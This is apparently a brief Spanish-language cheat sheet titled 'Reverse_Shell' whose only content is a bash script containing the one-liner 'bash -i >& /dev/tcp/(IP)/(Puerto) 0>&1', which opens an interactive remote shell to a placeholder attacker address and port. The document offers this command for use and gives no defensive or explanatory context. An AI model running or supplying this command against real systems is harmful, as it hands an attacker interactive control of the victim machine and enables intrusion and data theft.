# Reverse_Shell
Comandos para la Reverse_Shell
-----------------------------------------------------------------------------
# COMANDOS
Reverse_shell con bin/bash
-----------------------------------------------------------------------------
#!/bin/bash
bash -i >& /dev/tcp/(IP)/(Puerto) 0>&1
-----------------------------------------------------------------------------
